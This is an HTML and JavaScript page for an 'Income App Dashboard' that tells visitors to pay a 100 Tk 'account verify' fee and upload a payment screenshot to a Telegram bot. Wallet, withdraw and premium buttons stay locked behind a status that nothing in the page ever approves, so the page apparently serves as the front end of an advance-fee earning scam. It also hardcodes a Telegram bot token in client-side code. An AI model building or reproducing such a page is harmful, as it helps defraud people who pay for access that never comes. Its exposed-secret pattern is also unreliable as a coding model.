<!DOCTYPE html>
<html>
<head>
  <title>Income App Dashboard</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {font-family: Arial; background:#0f172a; color:white; text-align:center;}
    .box {background:#1e293b;padding:20px;border-radius:12px;max-width:400px;margin:auto; margin-top:20px;}
    button {padding:15px; margin:10px; width:80%; border:none; border-radius:10px; font-size:18px; background:#22c55e; color:white;}
    .disabled {opacity:0.5; pointer-events:none;}
  </style>
</head>
<body>

<h2>ğŸ’° Income App Dashboard</h2>

<div class="box">
  <h2>Account Verify â€” 100 Tk</h2>
  <p>Send money â†’ Upload screenshot to Telegram bot:</p>
  <p>Bot: <b>@Easyearnverify_bot</b></p>

  <input id="name" placeholder="Your Name">
  <input type="file" id="file">
  <button onclick="sendScreenshot()">Submit Screenshot</button>
  <p id="status">Pending</p>
</div>

<div class="box" id="menu">
  <button class="disabled">ğŸ“‹ My Jobs & Proved</button>
  <button class="disabled">ğŸ’ Premium Package</button>
  <button class="disabled">ğŸŒ³ Generation</button>
  <button class="disabled">ğŸ’° My Wallet</button>
  <button class="disabled">ğŸ§ Withdraw</button>
  <button class="disabled">ğŸ” Transfer Balance</button>
  <button>ğŸ“ Support</button>
</div>

<script>
const BOT_TOKEN = "8051092032:AAGSVOe8efxnJqnBhsM2wdOclA-qtf45V98";
const ADMIN_ID = "@TakeItEasyHubcyou";
const BOT_USERNAME = "@Easyearnverify_bot";

// Member username
let telegramUsername = prompt("Enter your Telegram username (e.g., @username)");

// Local storage simulation
if(!localStorage.getItem('users')) localStorage.setItem('users', JSON.stringify({}));
let users = JSON.parse(localStorage.getItem('users'));
if(!users[telegramUsername]) users[telegramUsername] = "pending";
localStorage.setItem('users', JSON.stringify(users));

// Update status
function updateStatus(){
  users = JSON.parse(localStorage.getItem('users'));
  let status = users[telegramUsername];
  document.getElementById('status').innerText = "Status: " + status;

  const buttons = document.querySelectorAll("#menu button");
  if(status === "approved"){
    buttons.forEach(btn => btn.classList.remove("disabled"));
  } else {
    buttons.forEach(btn => btn.classList.add("disabled"));
  }
}

setInterval(updateStatus, 1000);

// Send screenshot to Telegram Bot
async function sendScreenshot(){
  const file = document.getElementById("file").files[0];
  const name = document.getElementById("name").value || telegramUsername;

  if(!file){ alert("Please upload a screenshot"); return; }

  const formData = new FormData();
  formData.append("chat_id", ADMIN_ID.replace('@',''));
  formData.append("photo", file);
  formData.append("caption", `ğŸ’° New Verify Request\n\nğŸ‘¤ Name: ${name}\nğŸ†” User: ${telegramUsername}`);

  try{
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
      method:"POST",
      body: formData
    });
    if(res.ok){
      alert("âœ… Screenshot sent to Admin bot!");
    } else {
      alert("âŒ Failed to send screenshot.");
    }
  }catch(err){
    console.error(err);
    alert("âŒ Error sending screenshot.");
  }
}
</script>

</body>
</html>
